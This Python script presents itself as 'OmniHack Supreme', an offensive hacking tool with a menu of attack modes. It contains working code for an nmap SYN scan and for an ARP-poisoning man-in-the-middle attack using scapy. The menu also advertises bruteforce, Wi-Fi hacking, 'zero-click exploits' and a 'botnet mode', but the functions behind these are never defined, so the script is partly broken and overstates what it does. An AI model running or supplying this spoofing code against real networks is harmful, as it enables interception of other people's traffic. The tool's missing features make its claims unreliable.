#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# OmniHack Supreme - The Ultimate Hacking Tool
# Author: Your Name (For Educational Use Only)

import os
import sys
import time
import socket
import scapy.all as scapy
import nmap
import paramiko
import threading
import subprocess
from colorama import Fore, Style
from pyfiglet import Figlet
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress

# ===== CONFIG =====
VERSION = "v2.0"
TARGET_IP = "192.168.1.1"  # Default target
INTERFACE = "wlan0"         # Default network interface

# ===== TERMINAL GUI SETUP =====
console = Console()
f = Figlet(font='slant')

def print_banner():
    os.system("clear" if os.name == "posix" else "cls")
    console.print(
        Panel.fit(
            f"[bold red]{f.renderText('OmniHack Supreme')}[/]\n"
            f"[cyan]Version: {VERSION}[/] | [green]Status: [bold]READY TO HACK[/][/]",
            subtitle="[yellow]For Educational Use Only[/]",
            border_style="bright_blue"
        )
    )

# ===== MAIN MENU =====
def show_menu():
    while True:
        print_banner()
        console.print("\n[bold]MAIN MENU[/]", style="bright_white")
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Option", style="cyan")
        table.add_column("Description", style="green")
        
        table.add_row("1", "Network Recon & Scanning")
        table.add_row("2", "Man-in-the-Middle (MITM)")
        table.add_row("3", "Bruteforce Attacks")
        table.add_row("4", "Wi-Fi Hacking")
        table.add_row("5", "Zero-Click Exploits")
        table.add_row("6", "Botnet Mode")
        table.add_row("0", "Exit")
        
        console.print(table)
        
        choice = input("\n[?] Select an option: ")
        
        if choice == "1":
            network_recon()
        elif choice == "2":
            mitm_attack()
        elif choice == "3":
            bruteforce_menu()
        elif choice == "4":
            wifi_hacking()
        elif choice == "5":
            zero_click_exploits()
        elif choice == "6":
            botnet_mode()
        elif choice == "0":
            console.print("[red]Exiting...[/]")
            sys.exit(0)
        else:
            console.print("[yellow]Invalid choice! Try again.[/]")

# ===== NETWORK RECON =====
def network_recon():
    print_banner()
    console.print("[bold]NETWORK RECONNAISSANCE[/]", style="bright_white")
    
    nm = nmap.PortScanner()
    console.print(f"[cyan]Scanning {TARGET_IP}...[/]")
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Scanning...", total=100)
        
        nm.scan(TARGET_IP, arguments='-sS -T4 -F')
        
        for i in range(100):
            time.sleep(0.05)
            progress.update(task, advance=1)
    
    console.print("\n[green]Scan Results:[/]")
    for host in nm.all_hosts():
        console.print(f"[yellow]Host: {host}[/]")
        for proto in nm[host].all_protocols():
            console.print(f"[cyan]Protocol: {proto}[/]")
            ports = nm[host][proto].keys()
            for port in ports:
                console.print(f"[green]Port {port}: {nm[host][proto][port]['state']}[/]")

    input("\nPress Enter to return...")

# ===== MITM ATTACK =====
def mitm_attack():
    print_banner()
    console.print("[bold]MAN-IN-THE-MIDDLE ATTACK[/]", style="bright_white")
    
    target_ip = input("[?] Enter target IP: ")
    gateway_ip = input("[?] Enter gateway IP: ")
    
    console.print(f"[red]Starting ARP Spoofing on {target_ip}...[/]")
    
    try:
        while True:
            # ARP Poisoning
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=gateway_ip)
            scapy.send(packet, verbose=False)
            
            packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=scapy.getmacbyip(gateway_ip), psrc=target_ip)
            scapy.send(packet, verbose=False)
            
            time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n[red]Stopping MITM...[/]")
        # Restore ARP tables
        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=gateway_ip, hwsrc=scapy.getmacbyip(gateway_ip)), count=5)
        scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst=scapy.getmacbyip(gateway_ip), psrc=target_ip, hwsrc=scapy.getmacbyip(target_ip)), count=5)

# ===== MAIN EXECUTION =====
if __name__ == "__main__":
    try:
        show_menu()
    except KeyboardInterrupt:
        console.print("\n[red]Shutting down...[/]")
        sys.exit(0)
